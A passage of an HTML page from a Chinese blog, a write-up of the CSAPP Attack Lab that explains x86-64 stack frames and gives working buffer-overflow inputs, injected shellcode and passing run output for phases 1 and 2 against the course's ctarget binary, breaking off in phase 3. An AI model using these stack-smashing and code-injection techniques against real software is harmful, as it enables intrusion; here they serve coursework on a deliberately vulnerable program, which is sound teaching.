@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.5.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.5.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.5.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="预备知识《CSAPP》一书的自学实验Attacklab是针对缓冲区溢出漏洞的攻击，旨在加深对函数调用过程中的栈结构的理解，以及对缓冲区溢出漏洞的原理的认识，提醒程序员在编写代码的过程中注意到这些问题。 栈的结构首先，需要看一下运行时栈的结构：   上图展示一个过程P调用过程Q的例子，当x86-64过程需要的存储空间超出寄存器能够存放的大小时，就会在栈上分配空间，这个部分称为过程的“栈帧”。x86-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attacklab-Writeup">
+<meta property="og:url" content="http://yoursite.com/2018/11/29/Attacklab-Writeup/index.html">
+<meta property="og:site_name" content="爱洗澡的狐狸">
+<meta property="og:description" content="预备知识《CSAPP》一书的自学实验Attacklab是针对缓冲区溢出漏洞的攻击，旨在加深对函数调用过程中的栈结构的理解，以及对缓冲区溢出漏洞的原理的认识，提醒程序员在编写代码的过程中注意到这些问题。 栈的结构首先，需要看一下运行时栈的结构：   上图展示一个过程P调用过程Q的例子，当x86-64过程需要的存储空间超出寄存器能够存放的大小时，就会在栈上分配空间，这个部分称为过程的“栈帧”。x86-">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/uploads/csapp/attacklab/stack_status.png">
+<meta property="og:image" content="http://yoursite.com/uploads/csapp/attacklab/params_order.png">
+<meta property="og:image" content="http://yoursite.com/uploads/csapp/attacklab/gadget.png">
+<meta property="og:updated_time" content="2018-11-29T13:51:12.497Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Attacklab-Writeup">
+<meta name="twitter:description" content="预备知识《CSAPP》一书的自学实验Attacklab是针对缓冲区溢出漏洞的攻击，旨在加深对函数调用过程中的栈结构的理解，以及对缓冲区溢出漏洞的原理的认识，提醒程序员在编写代码的过程中注意到这些问题。 栈的结构首先，需要看一下运行时栈的结构：   上图展示一个过程P调用过程Q的例子，当x86-64过程需要的存储空间超出寄存器能够存放的大小时，就会在栈上分配空间，这个部分称为过程的“栈帧”。x86-">
+<meta name="twitter:image" content="http://yoursite.com/uploads/csapp/attacklab/stack_status.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="爱洗澡的狐狸" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/29/Attacklab-Writeup/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Attacklab-Writeup | 爱洗澡的狐狸</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">爱洗澡的狐狸</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/29/Attacklab-Writeup/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bathingfox">
+      <meta itemprop="description" content="我就是我，是颜色不一样的吃货！！！">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱洗澡的狐狸">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Attacklab-Writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-11-29 21:38:26 / Modified: 21:51:12" itemprop="dateCreated datePublished" datetime="2018-11-29T21:38:26+08:00">2018-11-29</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>《CSAPP》一书的自学实验Attacklab是针对缓冲区溢出漏洞的攻击，旨在加深对函数调用过程中的栈结构的理解，以及对缓冲区溢出漏洞的原理的认识，提醒程序员在编写代码的过程中注意到这些问题。</p>
+<p>栈的结构<br>首先，需要看一下运行时栈的结构：</p>
+<p><center><br>  <img src="/uploads/csapp/attacklab/stack_status.png" width="40%" height="50%"><br></center><br>上图展示一个过程P调用过程Q的例子，<strong>当x86-64过程需要的存储空间超出寄存器能够存放的大小时，就会在栈上分配空间</strong>，这个部分称为过程的<em>“栈帧”</em>。x86-64的栈向低地址方向增长，栈指针%rsp指向栈顶元素，可以用<code>push</code>和<code>pop</code>指令将数据存入栈中或是从栈中取出。<br><a id="more"></a></p>
+<blockquote>
+<ul>
+<li><code>push %reg</code>：<code>%rsp</code>的值减去<code>8</code>，把寄存器<code>%reg</code>中的值放到<code>(%rsp)</code>中 </li>
+<li><code>pop %reg</code>：把寄存器<code>(%rsp)</code>中的值放到<code>%reg</code>中，<code>%rsp</code>的值加上<code>8</code> </li>
+</ul>
+</blockquote>
+<p>当前正在执行的过程的帧总是在栈顶。当过程P调用过程Q时，会把返回地址压入栈中，指明当Q返回时，要从P程序的哪个位置继续执行。Q的代码会扩展当前栈的边界，分配它的栈帧所需要的空间。在这个空间中它可以<strong>保存寄存器的值，分配局部变量空间，为它调用的过程设置参数</strong>。 当x86-64的过程调用需要6个或更少的参数时，那么所有的参数都可以通过寄存器传递，其他更多的参数调用者会提前压在栈中。Bomblab中已经提到这一点，这里再重复一次6个参数所对应的寄存器：</p>
+<p><center><br>  <img src="/uploads/csapp/attacklab/params_order.png" width="90%" height="50%"><br></center><br>因为寄存器资源非常有限，在过程调用时需要对之前过程使用的寄存器进行保存。根据惯例：</p>
+<ul>
+<li>被调用者保存的寄存器：%rbx、%rbp、%r12、%r13、%r14、%r15</li>
+<li>调用者保存的寄存器：除去以上所列和栈指针%rsp之外的其他寄存器（可被任何函数修改）</li>
+<li>保存返回值的寄存器：%rax</li>
+</ul>
+<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><p>C语言对数组引用不进行任何边界检查，而且局部变量和状态信息都存放在栈中。这两种情况结合到一起就能够导致严重的程序错误，对越界的数组元素的写操作会破坏存储在栈中的状态信息。当程序使用这个被破坏的状态，试图重载加载寄存器或执行ret指令时，就会出现很严重的错误。</p>
+<p>缓冲区溢出是一种常见的状态破坏。通常，在栈中分配某个字符数组来保存一个字符串，但是字符串的长度超出了维数组分配的空间，这样就会导致返回信息被破坏。缓冲区溢出的一个更加致命的使用就是让程序执行它本来不愿意执行的函数，通过特殊构造的输入，可以覆盖原来的返回信息，使调用返回到攻击者期望的代码位置。</p>
+<h2 id="Attack-Lab"><a href="#Attack-Lab" class="headerlink" title="Attack Lab"></a>Attack Lab</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>从CSAPP的课程官方网址下载实验的压缩包，解压后里面有几个文件，其分别是：</p>
+<ul>
+<li>ctarget: 用来做代码注入攻击的程序</li>
+<li>rtarget: 用来做ROP攻击的程序</li>
+<li>cookie.txt: 一个8位的16进制代码，用来作为攻击的标识符</li>
+<li>farm.c: 用来找寻gadget的源文件</li>
+<li>hex2raw: 用来生成攻击字符串的程序</li>
+</ul>
+<p>ctarget和rtarget两个程序运行起来之后，都会要求用户输入一段字符串，看能不能触发期望的破坏行为。我们需要构造特定的字符串输入，但是要注意不能包含“0x0A”，这个表示“\n”，如果扫描到这个字符会提前终止输入。</p>
+<p>每个目标执行文件的具体使用可以看它的帮助信息，也可以去看实验对应的Writeup文件。</p>
+<h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h3><p>第一阶段的目标是将程序重定向到函数<code>touch1</code>的执行。实际上代码的执行顺序是main-&gt;stable_launch-&gt;launch-&gt;test-&gt;getbuf，就是在这个函数getbuf需要获取用户输入。函数test和函数touch1的源码分别如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>反编译ctarget之后可以找到函数<code>getbuf</code>的汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure></p>
+<p>要通过我们的输入将函数执行重定向到函数touch1，下面是该函数的汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到buf的其实位置为<code>%rsp</code>，在栈上分配了大小为0x28（40）字节的空间。只要填充了40个字节之后，追加上函数<code>touch1</code>的起始地址，就可以覆盖掉原来的返回地址。我们可以看到函数<code>touch1</code>的起始地址为0x4017c0。64位地址格式，所以最后填充的地址为0x00000000004017c0。还要注意大小端的问题，我的电脑是小端，从上面的汇编代码也能看出来。</p>
+<p>因为是小端地址，所以追加的地址格式应该是c0 17 40 00 00 00 00 00。至于40个字节的填充，可以是ASCII码中除了0x0a以外的其他字符所对应的十六进制。我们可以构造输入的字符串所对应的十六进制如下，然后使用hex2raw这个工具来生成输入字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure></p>
+<p>注意，这里的换行只是为了显示效果，实际在构造过程中不能换行。最终测试通过！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i phase_1.txt &gt; phase_1_r.txt </span><br><span class="line">$ ./ctarget -q &lt; phase_1_r.txt </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00</span><br></pre></td></tr></table></figure></p>
+<h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h3><p>第二个阶段的目标是重定向到函数<code>touch2</code>，其源码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>先看一下该函数的汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40181d:	e8 6b 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40183d:	e8 0d 05 00 00       	callq  401d4f &lt;fail&gt;</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，touch2需要检验参数%edi，看是否与cookie相等。所以，我们需要设法在重定向到touch2之前，将cookie值传给%edi。函数getbuf的缓冲区有40个字节，我们可以将要注入的代码放在其中，test的返回地址直接先重定向到缓冲区的地址。</p>
+<p>先确定要注入的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi 	# 将cookie赋值给%rdi</span><br><span class="line">push $0x4017ec			# 将touch2的地址压栈</span><br><span class="line">ret						# 返回指令，直接从栈上拿继续执行的代码地址</span><br></pre></td></tr></table></figure></p>
+<p>将上面的这段汇编语言写入一个文件中，使用gcc将其编译为目标文件，然后通过objdump反编译，查看其对应的十六进制。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c phase_2.s </span><br><span class="line">$ objdump -d phase_2.o</span><br></pre></td></tr></table></figure></p>
+<p>最终得到的结果为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">phase_2.o:     file format elf64-x86-64</span><br><span class="line">Disassembly of section .text:</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3                   	retq</span><br></pre></td></tr></table></figure></p>
+<p>还需要确认一下缓冲区的其实地址，可以让程序先跑起来，通过gdb来查看。设置断点到<code>getbuf</code>然后单步走一行，查看当前的栈指针：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print $rsp</span><br><span class="line">$1 = (void *) 0x5561dc78</span><br></pre></td></tr></table></figure></p>
+<p>所以我们最终构造的输入为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure></p>
+<p>验证通过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i phase_2.txt &gt; phase_2_r.txt</span><br><span class="line">$ ./ctarget -q &lt; phase_2_r.txt </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></table></figure></p>
+<h3 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h3><p>这一关需要重定向到函数<code>touch3</code>并成功运行，其源码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看出来，需要传入一个字符串，这个字符串是将cookie的值转成字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x59b997fa -&gt; 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure></p>
+<p>我们继续讲代码注入到<code>getbuf</code>的<code>buf</code>中，函数<code>touch3</code>的地址为0x4018fa，Phase 2已经知道<code>buf</code>的起始地址<code>%rsp</code>是0x5561dc78，<code>%rsp+0x28</code>是返回地址，再往上覆盖一部分作为我们注入的字符串位置，地址为<code>%rsp+0x30</code>。</p>
